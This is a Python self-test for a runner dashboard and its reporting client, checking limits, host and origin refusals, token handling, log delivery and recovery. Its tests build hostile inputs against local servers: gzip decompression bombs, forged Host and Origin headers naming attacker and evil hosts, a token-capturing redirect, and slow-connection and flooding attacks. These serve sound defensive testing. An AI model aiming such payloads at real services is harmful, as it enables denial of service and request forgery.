#!/usr/bin/env python3
"""Checks of the dashboard and of the program that reports to it, beyond line (o) of the self-test.

    python3 selftest/dashboard.py

Each fact is one line starting PASS or FAIL; the last line is FAILS=<count>, and the exit code is 1 if any failed.
It starts dashboards of its own on free ports of this machine (127.0.0.1), works in a temporary directory, and
stops and removes everything it started. It spends nothing and needs no agent. It takes about a minute, because
several of its facts are about what happens after a wait. The facts about the page's own rules are run under node,
and those about the Mac service's wait with zsh and curl: where one of those is not on the PATH, a line starting
SKIP says which facts were not run.

What it proves is what one runner, one page or one stranger must not be able to do to the others: a report in the
wrong shape cannot stop the page; a report cannot make the dashboard hold far more than was sent; callers that say
nothing cannot shut the others out; the token goes to no address but the one that was set; a name the dashboard was
not given is refused; a refusal is heard by the one refused; nothing is shown twice or cut in the middle, not when
an answer is lost and not when a log is written again; what cannot arrive is named and the rest arrives; a process
that is not a queue is not watched as one; nothing that is not plainly an identifier reaches a command. It also
proves which agent a session log names, from what bin/render_stream.py itself writes; when a runner hidden on the
page stays hidden and when it comes back; and that the Mac service waits for the dashboard it started.

The facts about limits, refusals, places, lost answers, logs written again and reports that cannot arrive were
each run as well against a copy of the kit with the thing they prove taken out, and failed there. So were the
facts about the agent a log names, the page's own rules and the Mac service's wait.
"""
import argparse, base64, gzip, hashlib, http.server, json, os, re, shutil, socket, subprocess, sys, tempfile, threading, time, urllib.error, urllib.request
KIT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
SP = tempfile.mkdtemp(prefix="runner-kit-dashboard-")
sys.path.insert(0, KIT + "/bin")
sys.path.insert(0, KIT + "/dashboard")
import runner_report as rr
import serve
FAILS, procs = [], []
NOTES = []      # what the reporter would write in its log, and whether in the queue log too
rr.note = lambda place, text, queue_log=False: NOTES.append((place.project, text, queue_log))
def until(test, seconds=15, every=0.05):
    """Wait for something to become so. True as soon as it is; False if it is not within the time."""
    end = time.time() + seconds
    while time.time() < end:
        if test(): return True
        time.sleep(every)
    return bool(test())
def rss(pid):
    """The memory a process holds, in megabytes, as the system counts it."""
    try: return int(subprocess.run(["ps", "-o", "rss=", "-p", str(pid)], capture_output=True, text=True).stdout.strip() or 0) / 1024
    except (OSError, ValueError): return 0
def dull(lines, width=64):
    """Text that packs to about half: lines of random hexadecimal, as a log of hashes and identifiers has."""
    return "".join(os.urandom(width // 2).hex() + "\n" for _ in range(lines))
def dense(characters):
    """Text that packs to about three quarters."""
    return base64.b64encode(os.urandom(characters * 3 // 4)).decode()
def after(u, rid, was):
    """The lines a page that had seen a runner as it `was` is given next."""
    return [r for r in strict(call(u + "/api/poll?since=%s:%d:%s" % (rid, was["seq"], was["life"]))[1])["runners"] if r["id"] == rid][0]
def runner_of(u, rid): return ([r for r in strict(call(u + "/api/poll")[1])["runners"] if r["id"] == rid] or [{}])[0]
class Between(http.server.BaseHTTPRequestHandler):
    """Something on the way to a dashboard. It hands reports on and their answers back, and can be told to take
    only small ones (as a proxy with a limit does, answering with a page of its own), to lose an answer after the
    dashboard has taken the report, or to hand reports on under another name."""
    def do_POST(self):
        cfg, body = self.server.cfg, self.rfile.read(int(self.headers.get("Content-Length", 0)))
        if cfg.get("once") and len(body) > cfg["once"]:
            cfg.pop("once")                 # one refusal, then it takes what it is given
            page = b"<html><body><h1>413 Request Entity Too Large</h1></body></html>"
            self.send_response(413); self.send_header("Content-Type", "text/html"); self.send_header("Content-Length", str(len(page))); self.end_headers(); self.wfile.write(page)
            return
        if cfg.get("limit") and len(body) > cfg["limit"]:
            cfg["refused"] = cfg.get("refused", 0) + 1
            page = b"<html><body><h1>413 Request Entity Too Large</h1></body></html>"
            self.send_response(413); self.send_header("Content-Type", "text/html"); self.send_header("Content-Length", str(len(page))); self.end_headers(); self.wfile.write(page)
            return
        headers = {k: v for k, v in self.headers.items() if k.lower() in ("content-type", "content-encoding", "authorization")}
        if cfg.get("host"): headers["Host"] = cfg["host"]
        try:
            with urllib.request.urlopen(urllib.request.Request(cfg["to"] + self.path, body, headers), timeout=10) as a: status, answer = a.status, a.read()
        except urllib.error.HTTPError as e: status, answer = e.code, e.read()
        if cfg.get("lose") and cfg["lose"](body):
            cfg["lost"] = cfg.get("lost", 0) + 1
            return                  # the dashboard took it; the one who sent it never hears
        self.send_response(status); self.send_header("Content-Type", "application/json"); self.send_header("Content-Length", str(len(answer))); self.end_headers(); self.wfile.write(answer)
    def log_message(self, *a): pass
def between(to, **cfg):
    server = http.server.ThreadingHTTPServer(("127.0.0.1", 0), Between); server.daemon_threads = True
    server.cfg = {"to": to, **cfg}
    threading.Thread(target=server.serve_forever, daemon=True).start()
    return "http://127.0.0.1:%d" % server.server_address[1], server.cfg
def raw_server(answer):
    """Something that answers every request with these bytes, however wrong they are, and hangs up."""
    srv = socket.socket(); srv.bind(("127.0.0.1", 0)); srv.listen(5)
    def run():
        while True:
            try: c, _ = srv.accept()
            except OSError: return
            c.settimeout(2)
            try:
                got = b""
                while b"\r\n\r\n" not in got: got += c.recv(65536)
                c.sendall(answer)
            except OSError: pass
            c.close()
    threading.Thread(target=run, daemon=True).start()
    return "http://127.0.0.1:%d" % srv.getsockname()[1]
def hundred(prefix, n):
    """n lines of exactly 100 bytes each, ending in the prefix and a number, so that a file of them rewritten with
    another prefix is the same size and differs where a log's lines differ: at the end, where the time or the count is."""
    return "".join("%s %s%03d\n" % ("." * (95 - len(prefix)), prefix, i) for i in range(n))
def of(prefix, lines): return sum(len(l) > 4 and l[-4] == prefix for l in lines)
def workspace(name, tasks="### 1.1 A task [ ]  M: S medium, R: O high\n"):
    w = tempfile.mkdtemp(dir=SP, prefix="rf-ws-"); os.makedirs(w + "/runs")
    open(w + "/TASKS.md", "w").write(tasks); open(w + "/RUN-ORDER.md", "w").write("1.1\n")
    open(w + "/runner.conf", "w").write("PROJECT=%s\nWORKSPACE='%s'\nREPOS='%s'\n" % (name, w, w))
    os.environ["RUNNER_CONF"] = w + "/runner.conf"
    return w, rr.Place(argparse.Namespace(project="", workspace="", tasks="", order="", runs="", agent="", session=""))
def reporting(place, u, task="1.1"):
    """A reporter at work as it is beside a runner, in a thread; it ends when its `given` is set to 0."""
    rep = rr.Reporter(place, os.getpid(), task)
    t = threading.Thread(target=rr.report_until_done, args=(place, rep, u, ""), daemon=True); t.start()
    return rep, t
def check(name, ok, detail=""):
    print(("PASS " if ok else "FAIL ") + name + ("" if ok else "  <- " + str(detail)[:300])); ok or FAILS.append(name)
def strict(raw):
    def no(c): raise ValueError(c)
    return json.loads(raw, parse_constant=no)
def serve_(*extra, state=None):
    state = state or tempfile.mkdtemp(dir=SP, prefix="rf-state-")
    p = subprocess.Popen([sys.executable, KIT + "/dashboard/serve.py", "--port", "0", "--state-dir", state, *extra], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
    procs.append(p)
    return p.stdout.readline().split("on ")[1].split("/ ")[0], state, p
def call(url, body=None, raw=None, method=None, **headers):
    data = raw if raw is not None else (json.dumps(body).encode() if body is not None else None)
    req = urllib.request.Request(url, data, {"Content-Type": "application/json", **headers} if data is not None else headers, method=method)
    try:
        with urllib.request.urlopen(req, timeout=10) as a: return a.status, a.read().decode()
    except urllib.error.HTTPError as e: return e.code, e.read().decode()
    except (urllib.error.URLError, OSError) as e: return 0, "connection: %s" % e      # the server hung up while it was being sent to
import atexit
def tidy():
    for p in procs:
        try: p.terminate()
        except Exception: pass
    shutil.rmtree(SP, ignore_errors=True)
atexit.register(tidy)
TOKEN = "a-token-for-this-test-only"
open(SP + "/token", "w").write(TOKEN + "\n")
# A stand-in for a queue: it only stays alive, under a queue's name.
open(SP + "/run_queue_standin.py", "w").write("import sys, time\ntime.sleep(float(sys.argv[1]))\n")
ok_runner = {"id": "good12345678", "sent": time.time(), "info": {"project": "good"}, "state": "idle", "tasks": {"hash": "h"}}

# ---- one report in the wrong shape cannot stop the page showing the others, now or after a restart
U, ST, P = serve_()
call(U + "/api/ingest", ok_runner)
c1 = call(U + "/api/ingest", raw=b'{"id":"nanrunner1","sent":NaN,"info":{"project":"nan"}}')[0]
c2 = call(U + "/api/ingest", raw=b'{"id":"infrunner1","sent":1e400,"info":{"project":"inf"},"usage":{"cost":1e999},"counts":{"done":"many"}}')[0]
c3 = call(U + "/api/ingest", {"id": "nullrunner1", "info": [], "queue": [None, 5, {"id": 7}, {"id": "1.1", "state": "done"}], "delivered": [None, {"id": 5}, {"id": "1.1"}],
                              "task": "x", "parked": {"a": 1}, "hours": [[1], "x", [3600, 2]], "sessions": [1], "last": {"id": "1.1"}, "deploy": 5, "tasks": 7, "usage": "none"})[0]
raw = call(U + "/api/poll")[1]
try:
    polled = {r["id"]: r for r in strict(raw)["runners"]}; valid = True
except ValueError as e:
    polled, valid = {}, False
n = polled.get("nullrunner1", {})
check("a report holding NaN is refused, and one holding a number too large to be a number is taken without it", (c1, c2) == (400, 200) and valid and polled.get("infrunner1", {}).get("usage", {}).get("cost", 0) is None, (c1, c2, valid))
check("wrong shapes are read into the page's own shape: no null in a list, no row without its id or its time", c3 == 200 and n.get("queue") == [{"id": "1.1", "title": "", "state": "done"}] and n.get("delivered") == [] and n.get("task") is None and n.get("info") == {} and n.get("hours") == [[3600, 2]] and n.get("last") is None and n.get("sessions") == {"work": None, "charge": None}, n)
check("the good runner is still served beside them", "good12345678" in polled)
P.terminate(); P.wait()
json.dump([{"id": "poisoned1234", "report": {"sent": float("nan"), "info": {"project": "old"}, "usage": {"cost": float("inf")}}, "seen": time.time(), "first": 1, "skew": float("nan")}], open(ST + "/runners.json", "w"))
U, ST, P = serve_(state=ST)
try: strict(call(U + "/api/poll")[1]); healed = True
except ValueError: healed = False
check("a state file that already holds NaN is read back clean after a restart", healed)

# ---- the token goes to the address that was set, and nowhere else
seen = []
class Capture(http.server.BaseHTTPRequestHandler):
    def do_GET(self): seen.append((self.path, self.headers.get("Authorization"))); self.send_response(200); self.end_headers(); self.wfile.write(b"{}")
    do_POST = do_GET
    def log_message(self, *a): pass
cap = http.server.HTTPServer(("127.0.0.1", 0), Capture); threading.Thread(target=cap.serve_forever, daemon=True).start()
class Redirect(http.server.BaseHTTPRequestHandler):
    def do_GET(self): self.send_response(302); self.send_header("Location", "http://127.0.0.1:%d/capture" % cap.server_address[1]); self.end_headers()
    do_POST = do_GET
    def log_message(self, *a): pass
red = http.server.HTTPServer(("127.0.0.1", 0), Redirect); threading.Thread(target=red.serve_forever, daemon=True).start()
said = ""
for body in (None, b"x"):
    try: rr.ask("http://127.0.0.1:%d/api/ingest" % red.server_address[1], "SECRET-TOKEN-123", body)
    except rr.Unsent as why: said = str(why)
check("a redirect is not followed, for a question or for a report, so the token reaches no other address", seen == [] and "redirect" in said, (seen, said))

# ---- names and hosts
UT, STT, PT = serve_("--token-file", SP + "/token")
call(UT + "/api/ingest", ok_runner, Authorization="Bearer " + TOKEN)
check("a name can be given by anyone who can open the page, token or no token, as serve.py says", call(UT + "/api/name", {"id": "good12345678", "name": "Mine"})[0] == 200)
UN, _, PN = serve_("--no-renaming"); call(UN + "/api/ingest", ok_runner)
check("with --no-renaming a name is refused, and the page is told not to offer one", call(UN + "/api/name", {"id": "good12345678", "name": "Mine"})[0] == 403 and strict(call(UN + "/api/poll")[1])["renaming"] is False)
check("a name sent from another site is refused by its Origin when the browser sends no Sec-Fetch-Site", call(UT + "/api/name", {"id": "good12345678", "name": "x"}, Origin="http://evil.example")[0] == 403 and call(UT + "/api/name", {"id": "good12345678", "name": "y"}, Origin=UT)[0] == 200)
check("a request sent to a name the dashboard was not given is refused: reading, naming and reporting alike", [call(UT + p, b, Host="attacker.example")[0] for p, b in (("/api/poll", None), ("/", None), ("/api/name", {"id": "good12345678", "name": "x"}), ("/api/ingest", ok_runner))] == [421] * 4)
UA, _, PA = serve_("--allow-host", "dash.example,other.example"); call(UA + "/api/ingest", ok_runner)
check("a name given with --allow-host is answered, as are this machine's own name and a numeric address", [call(UA + "/healthz", Host=h)[0] for h in ("dash.example:8443", "other.example", socket.gethostname().lower(), "127.0.0.1:1", "[::1]:9", "nope.example")] == [200, 200, 200, 200, 200, 421])
# A proxy that hands requests on under its own name for the dashboard, and an older browser that sends only Origin.
via = [call(u + "/api/name", {"id": "good12345678", "name": "Through a proxy"}, Origin=o) for u, o in ((UA, "https://dash.example"), (UA, "https://evil.example"), (UT, "https://dash.example"))]
check("a name from the dashboard's own page is taken when a proxy hands it on under another name, if the owner gave the page's name; any other page is refused and told what to do",
      [v[0] for v in via] == [200, 403, 403] and "--allow-host evil.example" in via[1][1] and runner_of(UA, "good12345678").get("label") == "Through a proxy", via)
UK, STK, PK = serve_(); call(UK + "/api/ingest", ok_runner)
os.chmod(STK, 0o500)
if os.geteuid() == 0: print("SKIP a name that cannot be kept is refused: this is run as root, which writes where it is told not to")
unkept = call(UK + "/api/name", {"id": "good12345678", "name": "Not kept"}); shown_unkept = runner_of(UK, "good12345678").get("label")
os.chmod(STK, 0o700)
kept = call(UK + "/api/name", {"id": "good12345678", "name": "Kept"})[0]
if os.geteuid() != 0: check("a name that cannot be kept is refused, with the reason, and is not shown; once it can be kept it is", unkept[0] == 500 and "could not keep the name" in unkept[1] and shown_unkept == "" and kept == 200 and runner_of(UK, "good12345678").get("label") == "Kept", (unkept, shown_unkept, kept))
BW, bw = between(UA, host="some-name.example")
try: rr.ask(BW + "/api/ingest", "", b"{}"); said = ""
except rr.Unsent as why: said = str(why)
check("a reporter whose dashboard does not know the name it is reached by is told so, and what to do about it", said.startswith("answered 421") and "--allow-host some-name.example" in said, said)

# ---- what a refused sender hears
check("a name longer than a name can be is refused before it is read (413)", call(UT + "/api/name", raw=b'{"id":"good12345678","name":"' + b"x" * 5000 + b'"}')[0] == 413)
def first_words(url, head, part, wait=3):
    """Send the head of a request and only part of its body, as a slow sender would; what comes back within the wait."""
    with socket.create_connection(("127.0.0.1", int(url.rsplit(":", 1)[1]))) as c:
        c.sendall(head + part); c.settimeout(wait)
        try: return c.recv(200).split(b"\r\n")[0].decode()
        except OSError as e: return "nothing: %s" % e
t0 = time.time(); heard = first_words(UT, b"POST /api/ingest HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: 1500000\r\n\r\n", b"x" * 10000)
check("a report with no token is refused at once, when only its first bytes have arrived (in %.2fs)" % (time.time() - t0), " 401 " in heard, heard)
big = {**ok_runner, "tasks_md": dense(2_000_000)}     # about a megabyte and a half, packed
try: rr.send(UT, "not-the-token", big); said = "taken"
except rr.Unsent as why: said = str(why)
check("a large report with the wrong token is told that its token is refused, not left with a broken connection", "refused this machine's token" in said, said)
try: rr.send(UT, TOKEN, {**big, "tasks_md": dense(3_500_000)}); said = "taken"
except rr.Unsent as why: said = str(why)
check("a report larger than the dashboard takes is told so, and how much it takes", said.startswith("answered 413: at most"), said)

# ---- what one report can cost the dashboard
UM, _, PM = serve_(); call(UM + "/api/ingest", ok_runner)
check("the values in a report are counted as they are, whatever its texts hold", serve.values_in(rb'{"a":"x,y[{\"}","b":"\\","c":[1,2,{"d":"\\\""}]}') == 14, serve.values_in(rb'{"a":"x,y[{\"}","b":"\\","c":[1,2,{"d":"\\\""}]}'))
packed = lambda raw: gzip.compress(raw, 5)
bombs = {
    "nine megabytes of empty lists": packed(b'{"id":"bomb00000001","x":[' + b"[]," * 3_000_000 + b'[]]}'),
    "a million empty lists": packed(b'{"id":"bomb00000002","x":[' + b"[]," * 1_200_000 + b'[]]}'),
    "a million empty texts": packed(b'{"id":"bomb00000003","x":[' + b'"",' * 1_200_000 + b'""]}'),
    "lists a hundred thousand deep": packed(b'{"id":"bomb00000004","x":' + b"[" * 100_000 + b"]" * 100_000 + b"}"),
    "a number three million digits long": packed(b'{"id":"bomb00000005","info":{"project":"digits"},"sent":' + b"1" * 3_000_000 + b"}"),
    "one text of four million characters": packed(('{"id":"bomb00000006","info":{"project":"long"},"note":"\U0001F600' + "A" * 3_900_000 + '"}').encode()),
}
base, peak, sampling = rss(PM.pid), [0.0], [True]
def sample():
    while sampling[0]: peak[0] = max(peak[0], rss(PM.pid)); time.sleep(0.01)
threading.Thread(target=sample, daemon=True).start()
codes, t0 = {}, time.time()
def throw(name): codes[name] = call(UM + "/api/ingest", raw=bombs[name], **{"Content-Encoding": "gzip"})[0]
for _ in range(2):      # each twice, two at a time, as many as the dashboard reads at once
    pair = [threading.Thread(target=throw, args=(name,)) for name in bombs]
    for t in pair: t.start()
    for t in pair: t.join()
took = time.time() - t0; time.sleep(0.1); sampling[0] = False
grew = peak[0] - base
check("a report sent to cost the dashboard its memory or its time is refused or read for what it is: %d to %d bytes packed, %.1fs for twelve of them" % (min(map(len, bombs.values())), max(map(len, bombs.values())), took),
      [codes[n] for n in bombs] == [413, 413, 413, 413, 200, 200] and took < 20 and runner_of(UM, "bomb00000005").get("sent", 0) is None, (codes, took))
check("and the dashboard held no more than %.0f MB more while it read them (from %.0f MB)" % (grew, base), 0 < peak[0] and grew < 150, (base, peak[0]))
check("a report that unpacks to more than 4 MB is refused", call(UM + "/api/ingest", raw=gzip.compress(b'{"id":"bomb12345678","x":"' + b"A" * (5 * 1024 * 1024) + b'"}'), **{"Content-Encoding": "gzip"})[0] == 413)

# ---- a page is answered while large reports are being taken
heavy = gzip.compress(json.dumps({**ok_runner, "out": {"name": "1.1-20260101-000000.log", "fresh": True, "from": 0, "to": 1_900_000, "text": "\n" * 1_900_000}}).encode(), 1)
busy, slowest, asked = [True], [0.0], [0]
def pour():
    while busy[0]: call(U + "/api/ingest", raw=heavy, **{"Content-Encoding": "gzip"})
pourers = [threading.Thread(target=pour, daemon=True) for _ in range(3)]
for t in pourers: t.start()
time.sleep(0.3); t0 = time.time()
while time.time() - t0 < 2.5:
    t1 = time.time(); code = call(U + "/api/poll")[0]; slowest[0] = max(slowest[0], time.time() - t1); asked[0] += code == 200
busy[0] = False
for t in pourers: t.join()
kept = len(runner_of(U, "good12345678")["lines"])
check("while reports of two million lines each pour in, a page's question is still answered: %d answered in 2.5s, the slowest in %.2fs" % (asked[0], slowest[0]), asked[0] >= 5 and slowest[0] < 0.3, (asked[0], slowest[0]))
check("and of those lines the page is given the last few hundred", 0 < kept <= 400, kept)

# ---- the places
for i in range(205): call(U + "/api/ingest", {"id": "flood%07d" % i, "sent": time.time(), "info": {"project": "f"}})
call(U + "/api/ingest", {**ok_runner, "id": "latecomer123"})
ids = {r["id"] for r in strict(call(U + "/api/poll")[1])["runners"]}
check("when every place on the page is taken, a runner that reports still gets one: the one silent longest gives way", "latecomer123" in ids and len(ids) <= 200, len(ids))
port = int(UA.rsplit(":", 1)[1])
held = [socket.create_connection(("127.0.0.1", port)) for _ in range(64)]    # sixty-four callers that say nothing
time.sleep(0.6); answers = [call(UA + "/healthz")[0] for _ in range(10)]
gone = 0
for h in held:
    h.settimeout(0.05)
    try: gone += h.recv(1) == b""
    except OSError: pass
    h.close()
check("sixty-four callers that connect and say nothing do not shut out the next ten: the one waited on longest gave up its place", answers == [200] * 10 and 1 <= gone <= 10, (answers, gone))
held = [socket.create_connection(("127.0.0.1", port)) for _ in range(64)]    # and sixty-four that begin a request and stop
for h in held: h.sendall(b"POST /api/name HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: 40\r\n\r\n{")
time.sleep(0.6); answers = [call(UA + "/healthz")[0] for _ in range(10)]
for h in held: h.close()
check("nor do sixty-four that begin a request and stop", answers == [200] * 10, answers)
big_tasks = "### 1.1 A task [ ]  M: S medium, R: O high\n" + dense(1_900_000)
call(UA + "/api/ingest", {**ok_runner, "tasks": {"hash": "bigtasks"}, "tasks_md": big_tasks})
slow = []
for _ in range(64):         # sixty-four callers that ask for a large answer and never read it
    c = socket.socket(); c.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2048); c.connect(("127.0.0.1", port))
    c.sendall(b"GET /api/tasks.md?id=good12345678 HTTP/1.1\r\nHost: 127.0.0.1\r\n\r\n"); slow.append(c)
time.sleep(0.8); answers = [call(UA + "/healthz")[0] for _ in range(10)]
for c in slow: c.close()
check("nor do sixty-four that ask for a large answer and never read it", answers == [200] * 10, answers)
burst = gzip.compress(json.dumps({"id": "burst0000001", "sent": time.time(), "info": {"project": "burst"}, "note": "A" * 3_900_000}).encode(), 9)
stop_flood = [False]
def flood():
    while not stop_flood[0]: call(UA + "/api/ingest", raw=burst, **{"Content-Encoding": "gzip"})
floods = [threading.Thread(target=flood, daemon=True) for _ in range(70)]
for t in floods: t.start()
time.sleep(1.5); answers = [call(UA + "/healthz")[0] for _ in range(10)]
stop_flood[0] = True
for t in floods: t.join(30)
check("while seventy senders each send a report of four megabytes unpacked (%d bytes sent), a page's question is answered: %d of 10" % (len(burst), answers.count(200)), answers.count(200) >= 8, answers)
class Caller:
    shut = 0
    def shutdown(self, how): self.shut += 1
desk = serve.Server(("127.0.0.1", 0), serve.Handler)
desk.callers = {Caller(): None for _ in range(serve.BUSY)}
all_at_work = desk.admit(Caller())
just_arrived, long_waiting = list(desk.callers)[:2]
desk.callers[just_arrived] = time.monotonic()
only_just = desk.admit(Caller())
desk.callers[long_waiting] = time.monotonic() - 5
newcomer = Caller(); gave_way = desk.admit(newcomer)
check("a place is taken from the caller waited on longest, never from one the dashboard is at work for, nor from one that has only just come",
      (all_at_work, only_just, gave_way) == (False, False, True) and long_waiting.shut == 1 and just_arrived.shut == 0 and long_waiting not in desk.callers and newcomer in desk.callers and len(desk.callers) == serve.BUSY,
      (all_at_work, only_just, gave_way, long_waiting.shut, len(desk.callers)))
desk.server_close()

# ---- the lines
W, place = workspace("lines")
LOG = W + "/runs/1.1-20260101-000000.log"
def shown(u=U, rid=None): return [l[2] for l in runner_of(u, rid or place.id).get("lines", []) if l[1] == "o"]
def cycle(rep, u):
    report, running = rep.build()
    rep.have = rr.send(u, "", report)
# An answer that is lost. The dashboard takes the first lines of a new log, and the reporter never hears that it did.
rr.EVERY = 0.05
def first_lines_of_a_log(body):
    out = json.loads(gzip.decompress(body)).get("out") or {}
    return bool(out.get("fresh") and out.get("text")) and not lossy.get("lost")
LU, lossy = between(U); lossy["lose"] = first_lines_of_a_log
open(LOG, "w").write("attempt 1 of 4: new session abc-123\nb1\nb2\nb3\n")
rep, thread = reporting(place, LU)
arrived = until(lambda: lossy.get("lost") == 1 and shown()[-1:] == ["b3"], 10)
open(LOG, "a").write("b4\n"); until(lambda: shown()[-1:] == ["b4"], 10)
rep.given = 0; thread.join(10)
check("a report that arrives, and whose answer is lost on the way back, is not sent twice: each line is shown once", arrived and shown() == ["attempt 1 of 4: new session abc-123", "b1", "b2", "b3", "b4"] and not thread.is_alive(), (lossy.get("lost"), shown()))
rr.EVERY = 2
rep = rr.Reporter(place, os.getpid(), "1.1")
for _ in range(2): cycle(rep, U)
open(LOG, "a").write("a line with a line separator   a next-line \u0085 a form feed \x0c and a return \r inside\n" + "L" * 600_000 + "\nafter the long line\nno line feed at the end")
for _ in range(4): cycle(rep, U)
got = shown()
check("a line is one row whatever it holds: line separator, next-line, form feed and return do not split it", sum("line separator" in l for l in got) == 1 and "inside" in [l for l in got if "line separator" in l][0], got[5:6])
check("a line of 600,000 characters is one row of its first characters", [len(l) for l in got if l.startswith("LLLL")] == [4000] and got[got.index("after the long line") - 1].startswith("LLLL"), [len(l) for l in got if l.startswith("L")])
check("a last line with no line feed waits while the runner is alive", "no line feed at the end" not in got)
rep.given = 0; rep.task = ""
for _ in range(3): cycle(rep, U)
check("and is delivered once the runner has ended", shown()[-1] == "no line feed at the end", shown()[-2:])
os.rename(LOG, LOG + ".old"); open(LOG, "w").write("x" * 900_000 + "\nreplaced file, line one\nreplaced file, line two\n")
for _ in range(3): cycle(rep, U)
check("a file put in another's place is read from a whole line, not from the middle of one", shown()[-2:] == ["replaced file, line one", "replaced file, line two"], shown()[-3:])
# The same file written again where it lies, longer than it was: a copy put back over a log, say. It keeps its name
# and its number, and the place the dashboard holds falls in the middle of one of its new lines.
again = ["written again, line %04d, and long enough that no old place falls on a line's end" % n for n in range(20000)]
was = runner_of(U, place.id)
with open(LOG, "r+") as f: f.write("\n".join(again) + "\n"); f.truncate()
for _ in range(3): cycle(rep, U)
rows = after(U, place.id, was)["lines"]
check("a file written again where it lies is read from a whole line too, and a rule across the output says so", len(rows) > 100 and rows[0][1] == "m" and all(l[1] == "o" and l[2] in set(again) for l in rows[1:]) and rows[-1][2] == again[-1], [r[1:] for r in rows[:3]])
was = runner_of(U, place.id)
with open(LOG, "w") as f: f.write("cut short and written again, line one\ncut short and written again, line two\n")
for _ in range(2): cycle(rep, U)
rows = after(U, place.id, was)["lines"]
check("a file cut short and written again is shown from its start, under a rule that says the log was written again", [r[1:] for r in rows] == [["m", "again"], ["o", "cut short and written again, line one"], ["o", "cut short and written again, line two"]], [r[1:] for r in rows[:4]])
QL = W + "/runs/queue.log"
open(QL, "w").write("".join("2026-01-01 10:0%d:00 task 1.%d: run_task.sh exit %d\n" % (n, n, n % 2) for n in range(4)))
first_count = dict(rep.build()[0]["usage"])
with open(QL, "r+") as f: f.write("".join("2026-01-02 10:00:%02d task 2.%d: run_task.sh exit 0\n" % (n, n) for n in range(9)))
second_count = rep.build()[0]["usage"]
check("the task runs in a queue log written again are counted afresh, not on top of the old count", (first_count["runs"], first_count["finished"], second_count["runs"], second_count["finished"]) == (4, 2, 9, 9), (first_count, second_count))
life = runner_of(U, place.id)
same, other = after(U, place.id, life), after(U, place.id, {"seq": 3, "life": "anotherlife"})
check("a page's place among the lines is good for one life of the runner only: with another life it starts afresh", same["reset"] is False and same["lines"] == [] and other["reset"] is True and len(other["lines"]) > 3)

# ---- what cannot arrive is named, and the rest arrives
# Something on the way that takes small requests only. First a log too large for it: the pieces come down in size
# until they pass, and every line arrives once.
rr.EVERY = 0.05
UL, _, PL_ = serve_()
NU, narrow = between(UL, limit=6000)
W2, place2 = workspace("narrow-log")
LOG2 = W2 + "/runs/1.1-20260101-000000.log"
text2 = "attempt 1 of 4: new session abc-456\n" + dull(600, 200)
open(LOG2, "w").write(text2)
tail2 = text2.encode()[-rr.TAIL:].split(b"\n", 1)[1].decode().split("\n")[:-1]      # what a reporter starts a log from
del NOTES[:]
rep2, thread2 = reporting(place2, NU)
said2 = []
whole2 = until(lambda: (said2.append(runner_of(UL, place2.id).get("unsent", "")) or shown(UL, place2.id) == tail2), 40)
calm2 = until(lambda: runner_of(UL, place2.id).get("unsent") == "", 10)
notes2 = [n for n in NOTES if n[0] == "narrow-log"]
check("a log too large for something on the way arrives all the same, in smaller pieces, each line once (%d reports turned back on the way)" % narrow.get("refused", 0), whole2 and narrow.get("refused", 0) >= 2, (len(shown(UL, place2.id)), len(tail2), narrow))
check("while it could not arrive, the runner's pane said what was not arriving and why; afterwards it says nothing", any("the session's output" in u and "answered 413" in u for u in said2) and calm2, sorted(set(said2)))
check("the queue log is told once that it is not arriving and once that it is again, and never that the dashboard was lost",
      [n[2] for n in notes2 if "not reaching it" in n[1]].count(True) == 1 and [n[2] for n in notes2 if "reaches it again" in n[1]] == [True] and not any("reached again" in n[1] or "cannot be reached" in n[1] for n in notes2) and len(notes2) <= 8, notes2)
rep2.given = 0; thread2.join(10)
# Then a task file too large for it: the output arrives, the task file is named as what does not, and it is tried
# again less and less often, not with every report.
W3, place3 = workspace("narrow-tasks", "### 1.1 A task [ ]  M: S medium, R: O high\n" + dull(3000))
open(W3 + "/runs/1.1-20260101-000000.log", "w").write("attempt 1 of 4: new session abc-789\nc1\nc2\n")
del NOTES[:]; narrow["refused"] = 0
rep3, thread3 = reporting(place3, NU)
named3 = until(lambda: runner_of(UL, place3.id).get("unsent", "").startswith("the task file, because the dashboard answered 413") and shown(UL, place3.id)[-1:] == ["c2"], 30)
before3 = narrow["refused"]; time.sleep(3); tries3 = narrow["refused"] - before3
check("a task file too large for it is named in the pane as what does not arrive, while the output does", named3 and call(UL + "/api/tasks?id=" + place3.id)[0] == 404, (runner_of(UL, place3.id).get("unsent"), shown(UL, place3.id)))
check("and it is tried again less and less often: %d times in the next three seconds, in which sixty reports went" % tries3, tries3 <= 6, tries3)
narrow["limit"] = None
healed3 = until(lambda: call(UL + "/api/tasks?id=" + place3.id)[0] == 200 and runner_of(UL, place3.id).get("unsent") == "", 20)
check("once it can arrive it does, and the pane stops saying so", healed3 and any("reaches it again" in n[1] for n in NOTES if n[0] == "narrow-tasks"), [n for n in NOTES if n[0] == "narrow-tasks"])
rep3.given = 0; thread3.join(10)
rr.EVERY = 2
long_file = SP + "/long-tasks.md"
open(long_file, "w").write("### 1.1 A task [ ]  M: S medium, R: O high\n" + "a line of the task's text\n" * 80000)
cut = rr.load_tasks(long_file)
check("a task file longer than a dashboard takes is sent cut at a line, and says so", len(cut["text"].encode()) <= rr.MOST_TASKS + 200 and cut["bytes"] > rr.MOST_TASKS and cut["text"].rstrip().endswith("is not shown here.)") and "\na line of the task's text\n\n(This task file" in cut["text"] and cut["hash"] == hashlib.sha1(open(long_file, "rb").read()).hexdigest())

# ---- a file written again where it lies is found out from what the dashboard holds
rr.EVERY = 0.05
W6, place6 = workspace("again-where-it-lies")
LOG6 = W6 + "/runs/1.1-20260101-000000.log"
head6 = "attempt 1 of 4: new session abc-666\n"
open(LOG6, "w").write(head6 + hundred("A", 20))
rep6 = rr.Reporter(place6, os.getpid(), "1.1")
for _ in range(3): cycle(rep6, U)
with open(LOG6, "r+") as f: f.write(head6 + hundred("B", 20)); f.truncate()       # the same file, the same size, other lines
rep6.build(); rep6.have = {}        # the report that would have carried the new file never arrives
for _ in range(4): cycle(rep6, U)
got6 = shown(U, place6.id)
check("a file written again where it lies, whose first report is lost, is read from its start: every new line, once (%d of 20)" % of("B", got6), of("B", got6) == 20 and of("A", got6) == 20, [l[-5:] for l in got6[:30]])
